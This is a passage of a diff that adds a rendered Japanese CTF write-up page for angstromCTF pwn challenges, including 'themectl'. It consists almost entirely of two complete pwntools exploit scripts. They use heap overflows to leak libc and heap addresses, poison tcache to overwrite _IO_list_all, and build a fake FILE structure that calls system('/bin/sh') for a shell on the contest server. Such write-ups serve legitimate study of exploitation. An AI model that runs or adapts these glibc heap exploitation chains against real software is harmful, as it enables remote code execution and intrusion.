+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">index: </span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(idx))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">your </span><span>&#39;)[:-</span><span style="color:#d08770;">5</span><span>]
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x28</span><span>)  </span><span style="color:#65737e;"># 0
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x28</span><span>)  </span><span style="color:#65737e;"># 1
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x1</span><span>)  </span><span style="color:#65737e;"># 2
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x1</span><span>)  </span><span style="color:#65737e;"># 3
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x3e0</span><span>)  </span><span style="color:#65737e;"># 4
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x28</span><span>)  </span><span style="color:#65737e;"># 5
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x28</span><span>, </span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">0x28 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x431</span><span>))
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">2</span><span>)
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x1</span><span>)  </span><span style="color:#65737e;"># 6
+</span><span>    libc_base = </span><span style="color:#bf616a;">s2u64</span><span>(</span><span style="color:#bf616a;">view</span><span>(</span><span style="color:#d08770;">3</span><span>).</span><span style="color:#bf616a;">splitlines</span><span>()[</span><span style="color:#d08770;">0</span><span>]) - </span><span style="color:#d08770;">0x21ace0
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x1</span><span>)  </span><span style="color:#65737e;"># 7
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x1</span><span>)  </span><span style="color:#65737e;"># 8
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">4</span><span>)
+</span><span>    heap_base = (</span><span style="color:#bf616a;">s2u64</span><span>(</span><span style="color:#bf616a;">view</span><span>(</span><span style="color:#d08770;">9</span><span>).</span><span style="color:#bf616a;">splitlines</span><span>()[</span><span style="color:#d08770;">0</span><span>]) - </span><span style="color:#d08770;">1</span><span>) &lt;&lt; </span><span style="color:#d08770;">12
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{heap_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>
+</span><span>    libc.address = libc_base
+</span><span>    fake_io = heap_base + </span><span style="color:#d08770;">0x1770
+</span><span>    payload = (
+</span><span>            </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\x00</span><span>&#39;  </span><span style="color:#65737e;"># rdi
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">8
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)  </span><span style="color:#65737e;"># rcx (!=0)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">2</span><span>)  </span><span style="color:#65737e;"># rdx
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(libc.sym[&quot;</span><span style="color:#a3be8c;">system</span><span>&quot;])
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">4
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(heap_base + </span><span style="color:#d08770;">0x5000</span><span>)  </span><span style="color:#65737e;"># writable area
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(fake_io + </span><span style="color:#d08770;">0x30</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">3
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(libc.sym[&#39;</span><span style="color:#a3be8c;">_IO_wfile_jumps</span><span>&#39;] + </span><span style="color:#d08770;">0x30</span><span>)  </span><span style="color:#65737e;"># _wide_data
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">6
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(fake_io + </span><span style="color:#d08770;">0x40</span><span>)
+</span><span>    )
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x400</span><span>, payload)
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x3c0</span><span>, payload)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>)  </span><span style="color:#65737e;"># 12
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>)  </span><span style="color:#65737e;"># 13
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>)  </span><span style="color:#65737e;"># 14
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">14</span><span>)
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">13</span><span>)
+</span><span>    </span><span style="color:#bf616a;">delete</span><span>(</span><span style="color:#d08770;">12</span><span>)
+</span><span>    IO_list_all = libc_base + </span><span style="color:#d08770;">0x21b680
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39; * </span><span style="color:#d08770;">0x38 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x41</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">ptr_guard</span><span>(heap_base + </span><span style="color:#d08770;">0x1bf0</span><span>, IO_list_all)))
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>)
+</span><span>    </span><span style="color:#bf616a;">alloc</span><span>(</span><span style="color:#d08770;">0x30</span><span>, </span><span style="color:#bf616a;">p64</span><span>(fake_io))
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">choice:</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">0</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">1
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./chall.p</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">challs.actf.co 31501</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#b48ead;">if </span><span>libc_name:
+</span><span>    libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<h1 id="pwn-themectl">[pwn] themectl</h1>
+<h2 id="jie-xi-4">解析</h2>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[*] &#39;/home/user/ctf/themectl/chall.p&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<p>プログラムの機能としてはユーザを作成しログインすることができ、それぞれのユーザが任意個のthemeを作成することができます。</p>
+<h2 id="exploit-6">exploit</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i: i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>([elf_name], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">sla</span><span>(</span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(y)
+</span><span>        time.</span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">0.1</span><span>)
+</span><span>
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">register</span><span>(</span><span style="color:#bf616a;">username</span><span>: bytes, </span><span style="color:#bf616a;">passwd</span><span>: bytes, </span><span style="color:#bf616a;">num</span><span>: int):
+</span><span>        t.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">name: </span><span>&#39;, username)
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">password: </span><span>&#39;, passwd)
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">like?</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(num))
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">login</span><span>(</span><span style="color:#bf616a;">username</span><span>: bytes, </span><span style="color:#bf616a;">passwd</span><span>: bytes):
+</span><span>        t.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">name: </span><span>&#39;, username)
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">password: </span><span>&#39;, passwd)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">edit</span><span>(</span><span style="color:#bf616a;">idx</span><span>: int, </span><span style="color:#bf616a;">content</span><span>: bytes):
+</span><span>        t.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">edit?</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(idx))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">idea: </span><span>&#39;, content)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">view</span><span>(</span><span style="color:#bf616a;">idx</span><span>: int) -&gt; bytes:
+</span><span>        t.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>        t.</span><span style="color:#bf616a;">sendlineafter</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">view? </span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(idx))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">--- OPTIONS ---</span><span>&#39;)[:-</span><span style="color:#d08770;">16</span><span>]
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">logout</span><span>():
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">4</span><span>))
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">register</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;, </span><span style="color:#d08770;">0x190</span><span>)
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    n = </span><span style="color:#d08770;">0xc
+</span><span>    </span><span style="color:#bf616a;">register</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;, n)
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">@</span><span>&#39; * </span><span style="color:#d08770;">0x28 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(n * </span><span style="color:#d08770;">8 </span><span>+ </span><span style="color:#d08770;">0x11</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(n))
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    buf = </span><span style="color:#bf616a;">view</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{buf</span><span style="color:#b48ead;">=</span><span>}&#39;)
+</span><span>    heap_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf) - </span><span style="color:#d08770;">0x1120
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{heap_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">register</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">C</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;, </span><span style="color:#d08770;">1</span><span>)
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39; * </span><span style="color:#d08770;">0x28 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0xdd1</span><span>))
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">register</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">D</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;, </span><span style="color:#d08770;">0xe00 </span><span>// </span><span style="color:#d08770;">8</span><span>)
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>
+</span><span>    libc_addr_ptr = heap_base + </span><span style="color:#d08770;">0x12a0
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">@</span><span>&#39; * </span><span style="color:#d08770;">0x28 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(n * </span><span style="color:#d08770;">8 </span><span>+ </span><span style="color:#d08770;">0x11</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(n) + </span><span style="color:#bf616a;">p64</span><span>(libc_addr_ptr))
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">s2u64</span><span>(</span><span style="color:#bf616a;">view</span><span>(</span><span style="color:#d08770;">0</span><span>)) - </span><span style="color:#d08770;">0x21ace0
+</span><span>    libc.address = libc_base
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    IO_list_all = libc_base + </span><span style="color:#d08770;">0x21b680
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">@</span><span>&#39; * </span><span style="color:#d08770;">0x28 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(n * </span><span style="color:#d08770;">8 </span><span>+ </span><span style="color:#d08770;">0x11</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(n) + </span><span style="color:#bf616a;">p64</span><span>(IO_list_all))
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    fake_io = heap_base + </span><span style="color:#d08770;">0x1210
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#bf616a;">p64</span><span>(fake_io))
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">login</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">C</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;&#39;)
+</span><span>    payload = (
+</span><span>            </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\x00</span><span>&#39;  </span><span style="color:#65737e;"># rdi
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">8
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)  </span><span style="color:#65737e;"># rcx (!=0)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">2</span><span>)  </span><span style="color:#65737e;"># rdx
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(libc.sym[&quot;</span><span style="color:#a3be8c;">system</span><span>&quot;])
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">4
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(heap_base + </span><span style="color:#d08770;">0x5000</span><span>)  </span><span style="color:#65737e;"># writable area
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(fake_io + </span><span style="color:#d08770;">0x30</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">3
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(libc.sym[&#39;</span><span style="color:#a3be8c;">_IO_wfile_jumps</span><span>&#39;] + </span><span style="color:#d08770;">0x30</span><span>)  </span><span style="color:#65737e;"># _wide_data
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">6
+</span><span>            + </span><span style="color:#bf616a;">p64</span><span>(fake_io + </span><span style="color:#d08770;">0x40</span><span>)
+</span><span>    )
+</span><span>    </span><span style="color:#bf616a;">edit</span><span>(</span><span style="color:#d08770;">0</span><span>, payload)
+</span><span>    </span><span style="color:#bf616a;">logout</span><span>()
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">&gt;</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">3</span><span>))
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">1
+</span><span>debug = </span><span style="color:#d08770;">1
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./themectl</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">challs.actf.co 31325</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#b48ead;">if </span><span>libc_name:
+</span><span>    libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+
+        </div>
+
+    
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Other posts</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://blog.rqda.wtf/cake-2023/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">CakeCTF 2023</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://blog.rqda.wtf/downunder-2024/">
+                            <span class="button__text">DownUnderCTF 2024 | faulty kernel</span>&nbsp;
